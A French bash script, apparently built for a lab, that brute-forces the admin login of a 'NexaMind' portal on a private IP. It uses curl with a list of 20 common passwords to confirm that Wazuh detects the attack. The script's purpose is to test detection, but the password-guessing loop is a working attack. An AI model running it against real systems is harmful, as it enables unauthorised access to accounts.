#!/bin/bash
# ==============================================================================
# SCRIPT D'ATTAQUE DE TEST — Brute-force sur le portail NexaMind
# Simule une attaque pour valider la détection Wazuh
# À lancer depuis Kali OU depuis n'importe quelle machine du réseau
# (sauf le portail lui-même, sinon l'IP source = localhost)
#
# ⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT sur VOTRE infra de test
# ==============================================================================

BLUE='\033[0;34m'; GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; NC='\033[0m'

TARGET="192.168.20.20"   # IP du portail srv-web-1
PORT="80"                # nginx écoute sur le port 80

echo -e "${BLUE}========================================================${NC}"
echo -e "${BLUE} ATTAQUE DE TEST — Brute-force sur le portail NexaMind${NC}"
echo -e "${BLUE} Cible : http://${TARGET}:${PORT}/login${NC}"
echo -e "${BLUE}========================================================${NC}"
echo
echo -e "${YELLOW}⚠️  Ceci est un test de sécurité sur VOTRE propre infra.${NC}"
echo

# ------------------------------------------------------------------------------
# Méthode 1 : avec curl (marche partout, pas besoin d'installer hydra)
# ------------------------------------------------------------------------------
echo -e "${BLUE}==== Lancement du brute-force (20 tentatives rapides) ====${NC}"
echo -e "${YELLOW}On envoie 20 tentatives de login en rafale...${NC}"
echo

PASSWORDS=("password" "admin" "123456" "admin123" "letmein" "qwerty" "root" "toor" "nexamind" "password1" "12345678" "abc123" "motdepasse" "azerty" "000000" "iloveyou" "welcome" "monkey" "dragon" "master")

for i in "${!PASSWORDS[@]}"; do
    PASS="${PASSWORDS[$i]}"
    # Envoyer une tentative de login avec un mauvais mot de passe
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "http://${TARGET}:${PORT}/login" \
        -d "username=admin&password=${PASS}" 2>/dev/null)
    echo -e "Tentative $((i+1))/20 : admin / ${PASS} → HTTP ${CODE}"
    sleep 0.3
done

echo
echo -e "${GREEN}========================================================${NC}"
echo -e "${GREEN}✅ Attaque terminée — 20 tentatives envoyées !${NC}"
echo -e "${GREEN}========================================================${NC}"
echo
echo -e "${BLUE}MAINTENANT, vérifie la détection :${NC}"
echo
echo -e "${YELLOW}1. Dans le dashboard Wazuh (https://192.168.20.22) :${NC}"
echo -e "   Menu ☰ → Threat Hunting (ou Security Events)"
echo -e "   Cherche les alertes 'NexaMind: Brute-force' ou 'Tentative de connexion'"
echo
echo -e "${YELLOW}2. Dans ton portail (page Alertes) :${NC}"
echo -e "   L'alerte devrait remonter automatiquement"
echo
echo -e "${BLUE}Si tu ne vois rien tout de suite, attends 1-2 min${NC}"
echo -e "${BLUE}(Wazuh analyse les logs par batch).${NC}"